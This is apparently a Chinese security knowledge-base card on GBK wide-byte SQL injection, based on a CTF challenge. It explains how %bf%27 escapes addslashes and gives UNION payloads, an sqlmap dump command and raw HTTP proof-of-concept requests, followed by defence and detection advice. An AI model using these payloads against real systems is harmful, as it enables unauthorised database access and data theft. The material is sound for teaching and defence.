---
id: web-generic-sqli-gbk-wide-byte-ctf-ezsql
title: 单引号被转义的 GBK 注入点用 %bf%27 宽字节逃逸并 UNION 取数
type: scenario
domain: web
path: web/generic/sqli
technique: sqli-gbk-wide-byte
tags:
- sqli
- gbk
- wide-byte
- union
- mysql
- waf-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V127
  verified_at: '2026-11-06T04:30:57+08:00'
  notes: 已对照原文与图01核对：1 and 1=2、单引号/双引号/括号组合均正常，2abc/2e0/2-1 返回 id=2；%bf%27 OR 1=1--+ 返回两条记录；UNION SELECT 1,database(),3,4,5、information_schema.tables、flag_store 取数；sqlmap unmagicquotes 实测 dump 出 flag，均与卡片一致。未验证点：PoC 未本机复跑；CTF 无组件版本；frontmatter 无 sources/source_url。
url: /docs/web/generic/sqli/web-generic-sqli-gbk-wide-byte-ctf-ezsql/
draft: false
kb_aliases:
- 宽字节注入
- '%bf%27 注入'
- GBK 宽字符绕过
- sqlmap unmagicquotes
- LitCTF ezsql
---

## 一句话结论

当后端把单引号转义为 `\'` 且数据库连接使用 GBK 字符集时，提交 `%bf%27` 会让 `bf 5c` 组成一个合法 GBK 汉字而“吃掉”反斜杠，单引号重新生效，随后可用 UNION 注入逐库逐表取数。

## 原理

- 转义函数（如 `addslashes`）按字节在 `'` 前插入 `0x5c`，不感知数据库字符集。
- GBK 双字节字符首字节 `0x81-0xFE`、次字节 `0x40-0xFE`，`0x5c` 落在次字节范围。
- 输入 `%bf%27` 解码为 `bf 27`，转义后为 `bf 5c 27`；MySQL 按 GBK 解析时把 `bf 5c` 当作一个汉字，`27` 成为未被转义的单引号，SQL 结构可被闭合。
- 先前的 `1 and 1=2 #`、`1'`、`1"`、`1')`、`1")` 都无报错且正常返回，说明引号被转义而非被过滤；`2abc`、`2e0`、`2-1` 都返回 id=2 说明参数被当作数值处理，进一步指向后端存在类型转换或转义处理。

## 触发条件

- 后端使用 GBK/GB2312/GB18030 等双字节字符集连接 MySQL。
- 单引号依赖转义函数处理而非参数化查询，且注入点位于字符串字面量内。
- UNION 列数可枚举，查询结果会回显。

## 利用步骤

1. 用 `1 and 1=2 #`、`1'`、`1"` 等判断闭合与过滤行为；若均正常返回且数据不变，怀疑转义。
2. 提交 `id=1%bf%27 OR 1=1--+`，返回两条记录即证明宽字节逃逸成功。
3. 用 `id=-1%bf%27 UNION SELECT 1,database(),3,4,5--+` 确认回显位与库名。
4. 查表：`UNION SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database()--+`。
5. 查字段并取数据：`UNION SELECT 1,2,3,4,group_concat(flag) FROM flag_store--+`。
6. 工具化：`sqlmap -u "<url>?id=1" -D <db> -T <table> -C <col> --dump --tamper=unmagicquotes --delay=0.5`。

## PoC

```http
GET /query?id=1%bf%27%20OR%201=1--+ HTTP/1.1
Host: target
```

```http
GET /query?id=-1%bf%27%20UNION%20SELECT%201,database(),3,4,5--+ HTTP/1.1
Host: target
```

## 变体与关联

- 首字节可换 `%df`、`%81` 等，取决于字符集与目标解析结果。
- 若为 POST/JSON 注入点，同样把 `%bf%27` 作为字符串内容提交。
- 关联：[[web-generic-sqli-gbk-wide-byte-escape-bypass]]（同技术的通用卡）。

## 检测与防御

- 使用参数化查询/预编译，统一连接字符集为 utf8mb4，使用字符集感知的转义函数。
- 检测参数中的 `%bf%27`、`%df%27` 等高位字节紧跟单引号的组合，以及同一参数反复出现布尔/UNION 片段。
